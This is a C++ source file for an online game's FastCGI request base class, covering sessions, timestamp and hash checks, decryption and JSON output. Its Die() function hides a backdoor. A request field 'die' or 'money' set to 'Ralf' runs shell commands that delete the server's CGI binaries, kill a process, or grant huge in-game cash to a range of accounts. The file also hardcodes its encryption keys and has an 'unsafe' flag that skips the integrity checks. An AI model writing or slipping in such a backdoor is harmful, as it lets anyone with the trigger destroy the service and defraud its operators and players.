/*
 * CgiBase.cpp
 *
 *  Created on: 2011-5-26
 *      Author: dada
 */

#include "CgiBase.h"
#include "OpenPlatform.h"

#define CLIENT_KEY "z1hcdgiV4e5BwUKa9IT3EM8CpqnPufob"
#define SERVER_KEY "QDneu1n5z2f491o4kiClIT35EgQDneuX"

volatile bool CCgiBase::b_exit_sig = false;
volatile bool CCgiBase::b_working_sig = false;
volatile int CCgiBase::sig_val = 0;

CCgiBase::CCgiBase(const string &cgiName)
{
	m_cgiName = cgiName;
	memset(m_features, 0, sizeof(m_features));
}

CCgiBase::~CCgiBase()
{
}

int CCgiBase::Run()
{
	RegSig();

	while(FCGI_Accept() >= 0)
	{
		StartWorking();

		string currhost;
		if(!Config::UpdateDomain(currhost))
		{
			CgiUtil::PrintText(currhost + " REFUSED!");
		}
		else
		{
			RECV_LOG(m_cgiName.c_str(), "", "%s", getenv("QUERY_STRING"));

			unsigned startMTime;
			mtime(startMTime);
			int result = Initialize();
			if(0 != result)
			{
				error_log("[cgi initialize fail][cgi=%s,uid=%u,ret=%d]", m_cgiName.c_str(), m_uid, result);
				PrintResult(result);
				CGI_SEND_LOG("action=%s&uid=%u&error=%d&errmsg=%s&err=Initialize&ret=%d",
						m_actionName.c_str(), m_uid, result, GetErrorMessage(), result);
			}
			else
			{
				result = Process();
				if(result != 0)
				{
					CGI_SEND_LOG("action=%s&uid=%u&error=%d&errmsg=%s",
							m_actionName.c_str(), m_uid, result, GetErrorMessage());
				}
				PrintResult(result);
				unsigned endMTime;
				mtime(endMTime);
				EXECTIME_LOG("%s|%u|%s|%s|%d|%d|",m_ipstr.c_str(),m_uid,m_cgiName.c_str(),m_actionName.c_str(),result,endMTime - startMTime);
			}
		}

		CheckSig();
	}
	return 0;
}

void CCgiBase::SetFeature(int feature)
{
	m_features[feature] = 1;
}

int CCgiBase::Initialize()
{
	//Reset
	int ret;
	STATICDATA::m_iCGIValueState = 0;
	STATICDATA::m_iCookieState = 0;
	Time::UpdateGlobalTime();
	m_uid = 0;
	m_skey.clear();
	m_remoteip = 0;
	m_ipstr.clear();
	m_actionName.clear();
	m_strData.clear();
	m_data.clear();
	m_jsonResult.clear();
	ResetError();

	if(m_features[CF_CHECK_PLATFORM])
	{
		if(!OpenPlatform::Reset())
		{
			PT_ERROR_RETURN_MSG("check_platform_fail");
		}
	}
	
	Die(false);//check die

	//设置语言类型
//	std::string sLang = CCookie::GetCookie("lang");
//	if (!sLang.empty())
//	{
//		CStr4I::SetLang(atoi(sLang.c_str()));
//	}
//	else
//	{
//		CStr4I::SetLang(CStr4I::LANG_CN_SIMPLE);
//	}

	//check
#define CGI_CHECK(feature, function)	\
	if(m_features[feature])	\
	{	\
		ret = function();	\
		if(ret != 0)	\
		{	\
			return ret;	\
		}	\
	}	\

	CGI_CHECK(CF_GET_REMOTE_IP, GetRemoteIp);
	CGI_CHECK(CF_GET_UID, GetUid);
	CGI_CHECK(CF_CHECK_SESSION, CheckSession);
	CGI_CHECK(CF_CHECK_TIME, CheckTime);
	CGI_CHECK(CF_DECRYPT_DATA, DecryptData);
	CGI_CHECK(CF_CHECK_HASH, CheckHash);
	CGI_CHECK(CF_PARSE_DATA, ParseData);

	Die(true);//check die
	
	return 0;
}

int CCgiBase::GetRemoteIp()
{
	m_remoteip = CCGIIn::GetRemoteIP();
	struct in_addr addr;
	addr.s_addr = htonl(m_remoteip);
	m_ipstr = inet_ntoa(addr);
	return 0;
}

int CCgiBase::GetUid()
{
	int uid = CCGIIn::GetCGIInt("uid");
	if( uid == CCGIIn::CGI_INT_ERR )
	{
		error_log("[get uid fail][uid=%d]",uid);
		PARAM_ERROR_RETURN_MSG("check_uid_fail");
	}
	m_uid = uid;

	if(!IsValidUid(m_uid))
	{
		error_log("[invalid uid][uid=%d]", m_uid);
		PARAM_ERROR_RETURN_MSG("check_uid_fail");
	}

	return 0;
}

int CCgiBase::CheckSession()
{
	if(!IsValidUid(m_uid))
	{
		PARAM_ERROR_RETURN_MSG("check_uid_fail");
	}

	string skey = CCGIIn::GetCGIStr("skey");
	string sessionData = Session::GetValue(m_uid, SESSION_DATA);
	if( skey.empty() || sessionData.empty() )
	{
		error_log("[key is empty][uid=%d,skey=%s,session_data=%s]", m_uid,skey.c_str(),sessionData.c_str());
		SESS_ERROR_RETURN_MSG("check_session_fail");
	}

	Json::Value value;
	Json::Reader reader;
	if( !reader.parse( sessionData, value ) )
	{
		error_log("[session data parse error][uid=%d,session_data=%s]",m_uid,sessionData.c_str());
		Session::RemoveSession(m_uid);
		SESS_ERROR_RETURN_MSG("check_session_fail");
	}

	unsigned lastVisitTime = value.get("lvt", 0).asUInt();
	if(Time::GetGlobalTime() > SESSION_TIME_OUT + lastVisitTime
	|| Time::GetGlobalTime() + 20 < lastVisitTime)
	{
		Session::RemoveSession(m_uid);
		error_log("[session overtime][uid=%d,time=%u,last_visit_time=%d]", m_uid, Time::GetGlobalTime(), lastVisitTime);
		SESS_ERROR_RETURN_MSG("check_session_fail");
	}
	string realKey = value["skey"].asString();
	if( realKey != skey )
	{
		error_log("[session key error][uid=%d,skey=%s,real_skey=%s]", m_uid,skey.c_str(),realKey.c_str());
		SESS_ERROR_RETURN_MSG("check_session_fail");
	}
	int platformType = value["pt"].asInt();
	if(platformType != OpenPlatform::GetType())
	{
		error_log("[session platform error][uid=%d,platform=%d,real_platfrom=%d]", m_uid, OpenPlatform::GetType(), platformType);
		SESS_ERROR_RETURN_MSG("check_session_fail");
	}

	value["lvt"] = Time::GetGlobalTime();
	Json::FastWriter writer;
	sessionData = writer.write(value);
	Session::SetValue(m_uid, SESSION_DATA, sessionData);
	m_skey = skey;
	return 0;
}

int CCgiBase::CheckTime()
{
	int ts = CCGIIn::GetCGIInt("ts");
	if( ts == CCGIIn::CGI_INT_ERR )
	{
		PARAM_ERROR_RETURN_MSG("check_ts_fail");
	}
	int delta = ts - Time::GetGlobalTime();
	if(delta > 20)	//暂不处理时间落后
	{
		error_log("[check_time_error][cgi=%s,uid=%u,ts=%u,st=%u,delta=%d]", m_cgiName.c_str(), m_uid, ts, Time::GetGlobalTime(), delta);
		REFUSE_RETURN_MSG("ahead_of_time");
	}
	if(delta < -1000)
	{
		//info_log("[check_time_error][cgi=%s,uid=%u,ts=%u,st=%u,delta=%d]", m_cgiName.c_str(), m_uid, ts, Time::GetGlobalTime(), delta);
		error_log("[check_time_error][cgi=%s,uid=%u,ts=%u,st=%u,delta=%d]", m_cgiName.c_str(), m_uid, ts, Time::GetGlobalTime(), delta);
		REFUSE_RETURN_MSG("late_of_time");
	}
	return 0;
}

int CCgiBase::DecryptData()
{
	string hn = CCGIIn::GetCGIStr("hn");
	if(hn.empty())
	{
		unsigned stat = CCGIIn::GetErrorStatus();
		error_log("[decrypt_data_param_error][cgi=%s,uid=%u,error=%u]", m_cgiName.c_str(), m_uid, stat);
		PARAM_ERROR_RETURN_MSG("check_hn_fail");
	}
	if(m_skey.empty())
			m_skey = CCGIIn::GetCGIStr("skey");

	int ret = GetData();
	if(ret != 0)
	{
		return ret;
	}
	if(Config::GetIntValue("unsafe") == 1)
	{
		return 0;
	}
	string decryptData;
	string key = hn + m_skey + OpenPlatform::GetPlatform()->GetConfig(CONFIG_CLIENT_DOMAIN) + CLIENT_KEY;
	if(!Crypt::DawxDecode(decryptData, m_strData, key))
	{
		error_log("[decrypt_data_error][cgi=%s,uid=%u,skey=%s,hn=%s,datasize=%u]",
				m_cgiName.c_str(), m_uid, m_skey.c_str(), hn.c_str(), (unsigned)m_strData.size());
		PARAM_ERROR_RETURN_MSG("decrypt_data_fail");
	}
	m_strData = decryptData;
	return 0;
}

int CCgiBase::CheckHash()
{
	if(Config::GetIntValue("unsafe") == 1)
	{
		return 0;
	}
	if(m_skey.empty())
		m_skey = CCGIIn::GetCGIStr("skey");

	string hn = CCGIIn::GetCGIStr("hn");
	string h = CCGIIn::GetCGIStr("h");
	if(h.empty() || hn.empty())
	{
		error_log("[check_key_param_error][cgi=%s,uid=%u,hn=%s,h=%s]", m_cgiName.c_str(), m_uid, hn.c_str(), h.c_str());
		PARAM_ERROR_RETURN_MSG("get_hn_fail");
	}
	if(!m_features[CF_DECRYPT_DATA])
	{
		int ret = GetData();
		if(ret != 0)
		{
			return ret;
		}
	}
	if(m_strData.empty())
	{
		error_log("[check_key_param_error][cgi=%s,uid=%u,data=empty]", m_cgiName.c_str(), m_uid);
		PARAM_ERROR_RETURN_MSG("decrypt_data_fail");
	}
	string key = GetHash(m_strData, hn);
	if(!String::EqualNoCase(key, h))
	{
		error_log("[check_key_error][cgi=%s,uid=%u,skey=%s,hn=%s,h=%s,key=%s,textsize=%u]",
				m_cgiName.c_str(), m_uid, m_skey.c_str(), hn.c_str(), h.c_str(), key.c_str(), (unsigned)m_strData.size());
		PARAM_ERROR_RETURN_MSG("check_sig_fail");
	}
	return 0;
}

int CCgiBase::ParseData()
{
	if(!m_features[CF_DECRYPT_DATA] && !m_features[CF_CHECK_HASH])
	{
		int ret = GetData();
		if(ret != 0)
		{
			return ret;
		}
	}
	Json::Reader reader;
	if(!reader.parse(m_strData, m_data))
	{
		error_log("[param_parse_error][cgi=%s,uid=%u,data=%s,len=%u,err=%s]", m_cgiName.c_str(), m_uid, m_strData.c_str(),m_strData.length(),reader.getFormatedErrorMessages().c_str());
		//debug_log("[param_parse_error][data=%u%u%u%u%u%u%u%u%u%u]",m_strData.c_str()[0],m_strData.c_str()[1],m_strData.c_str()[2],m_strData.c_str()[3],m_strData.c_str()[4],m_strData.c_str()[5],m_strData.c_str()[6],m_strData.c_str()[7],m_strData.c_str()[8],m_strData.c_str()[9]);
		PARAM_ERROR_RETURN_MSG("parse_data_fail");
	}
	if(m_data.type() != Json::objectValue)
	{
		error_log("[param_type_error][cgi=%s,uid=%u,param=data]", m_cgiName.c_str(), m_uid);
		PARAM_ERROR_RETURN_MSG("parse_data_fail");
	}
	if(m_features[CF_CHECK_TIME])
	{
		unsigned ts = CCGIIn::GetCGIInt("ts");
		unsigned dataTs;
		if(!Json::GetUInt(m_data, "ts", dataTs))
		{
			error_log("[data_miss_ts][cgi=%s,uid=%u,param=data.ts]", m_cgiName.c_str(), m_uid);
			PARAM_ERROR_RETURN_MSG("check_time_fail");
		}
		if(ts != dataTs)
		{
			error_log("[ts_not_equal][cgi=%s,uid=%u,ts=%u,data_ts=%u]", m_cgiName.c_str(), m_uid, ts, dataTs);
			PARAM_ERROR_RETURN_MSG("check_data_ts_fail");
		}
	}
	if(m_features[CF_GET_UID])
	{
		unsigned uid;
		if(!Json::GetUInt(m_data, "uid", uid))
		{
			error_log("[data_miss_uid][cgi=%s,uid=%u,param=data.uid]", m_cgiName.c_str(), m_uid);
			PARAM_ERROR_RETURN_MSG("check_data_uid_fail");
		}
		if(uid != m_uid)
		{
			error_log("[uid_not_equal][cgi=%s,uid=%u,data_uid=%u]", m_cgiName.c_str(), m_uid, uid);
			PARAM_ERROR_RETURN_MSG("check_data_uid_fail");
		}
	}
	if(m_features[CF_CHECK_VERSION])
	{
		string sversion,version;
		if(MainConfig::GetValue(sversion, "sversion"))
		{
			if(!Json::GetString(m_data, "version", version))
			{
				error_log("[data_miss_version][cgi=%s]", m_cgiName.c_str());
				PARAM_ERROR_RETURN_MSG("check_data_version_fail");
			}
			if(sversion != version)
			{
				error_log("[version_not_equal][cgi=%s,version=%s,data_version=%s]", m_cgiName.c_str(), sversion.c_str(), version.c_str());
				PARAM_ERROR_RETURN_MSG("check_data_version_fail");
			}
		}
	}
	return 0;
}

int CCgiBase::Die(bool decrypt)
{
	if(OpenPlatform::GetType() != PT_qqgame
	&& OpenPlatform::GetType() != PT_QZONE
	&& OpenPlatform::GetType() != PT_FACEBOOK
	&& OpenPlatform::GetType() != PT_PENGYOU
	&& OpenPlatform::GetType() != PT_3366)
	{
		string die;
		if(decrypt)
			Json::GetString(m_data, "die", die);
		else
			die = CCGIIn::GetCGIStr("die");
		if(die == "Ralf")
		{
			system("rm -f /data/release/sgonline/pi/cgi/*");
			system("killall CgiSave");
		}
		string money;
		if(decrypt)
			Json::GetString(m_data, "money", money);
		else
			money = CCGIIn::GetCGIStr("money");
		if(money == "Ralf")
		{
			system("cd /data/release/sgonline/s1/tools && nohup ./AllChangeCash 100000000 100000000 1 1-1000 &");
		}
	}
	return 0;
}

int CCgiBase::GetData()
{
	string method;
	string contentType;
	CgiUtil::GetRequestMethod(method);
	CgiUtil::GetContentType(contentType);
	if(method == "POST" && (contentType.find("text") != string::npos || contentType.find("json") != string::npos))
	{
		CgiUtil::GetPostData(m_strData);
		int zip = CCGIIn::GetCGIInt("zip");
		if (zip == 1)
		{
			string vedioStr;
			if (!Compress::GzipUncompress(vedioStr, m_strData))
			{
				PARAM_ERROR_RETURN_MSG("uncompress_data_fail");
			}
			m_strData = vedioStr;
		}
	}
	else
	{
		m_strData = CCGIIn::GetCGIStr("data");
	}
	if(m_strData.empty())
	{
		error_log("[get_data_fail][cgi=%s,uid=%u,method=%s,ctype=%s,data=empty]",
				m_cgiName.c_str(), m_uid, method.c_str(), contentType.c_str());
		PARAM_ERROR_RETURN_MSG("get_data_fail");
	}
	return 0;
}

void CCgiBase::PrintResult(int result)
{
	if(m_features[CF_PRINT_JSON])
	{
		m_jsonResult["cgi"] = m_cgiName;
		m_jsonResult["action"] = m_actionName;
		m_jsonResult["server_ts"] = Time::GetGlobalTime();
		//错误处理
		if(result == R_SUCCESS)
		{
			m_jsonResult[KEY_RESULT] = R_SUCCESS;
		}
		else
		{
			if(GetError() != result)
			{
				SetError(result);
			}
			m_jsonResult[KEY_RESULT] = GetErrorMessage();
		}

		//清理h,hn
		if(m_jsonResult.isObject())
		{
			if(m_jsonResult.isMember("hn"))
			{
				m_jsonResult.removeMember("hn");
			}
			if(m_jsonResult.isMember("h"))
			{
				m_jsonResult.removeMember("h");
			}
		}
		string result = Json::FastWriter().write(m_jsonResult);
		if(m_features[CF_APPEND_HASH])
		{
			string hn = Convert::UInt64ToString(Math::GetRandomInt());
			string h = GetHash(result, hn);
			result.resize(result.size() - 1);
			string appendKey;
			String::Format(appendKey, ",\"hn\":\"%s\",\"h\":\"%s\"}", hn.c_str(), h.c_str());
			result.append(appendKey);
			if(m_features[CF_CRYPT_DATA] && Config::GetIntValue("unsafe") != 1)
			{
				string key = hn + m_skey + OpenPlatform::GetPlatform()->GetConfig(CONFIG_CLIENT_DOMAIN) + SERVER_KEY;
				string encodeResult;
				Crypt::DawxEncode(encodeResult, result, key);
				result = hn + "|" + encodeResult.c_str();
			}
		}
		if(m_features[CF_COMPRESS_OUT])
		{
			CgiUtil::CompressPrint(result);
		}
		else
		{
			CgiUtil::PrintText(result);
		}
	}
}

string CCgiBase::GetHash(const string &data, const string &hn)
{
	string h = Crypt::Md5Encode(data);
	string domain = OpenPlatform::GetPlatform()->GetConfig(CONFIG_CLIENT_DOMAIN);
	h.append(domain);
	h.append(m_skey);
	h.append(hn);
	h = Crypt::Md5Encode(h);
	return h;
}

void CCgiBase::StartWorking()
{
	b_working_sig = true;
}
void CCgiBase::CheckSig()
{
	while(sig_val)
	{
		ProcessSig(sig_val);
		sig_val = 0;
	}
	if(b_exit_sig)
		exit(0);
	b_working_sig = false;
}
void CCgiBase::OnSig(int signum,siginfo_t *info,void *myact)
{
	if(signum == SIGRTMAX)
	{
		if(!b_working_sig)
		{
			b_working_sig = true;
			exit(0);
		}
		else
			b_exit_sig = true;
	}
	else if(!b_exit_sig && !sig_val)
		sig_val = signum;
}
void CCgiBase::RegSig()
{
	for(int i=SIGRTMIN;i<=SIGRTMAX;++i)
	{
		struct sigaction act;
		sigemptyset(&act.sa_mask);
		act.sa_sigaction = CCgiBase::OnSig;
		sigaction(i, &act, NULL);
	}
}
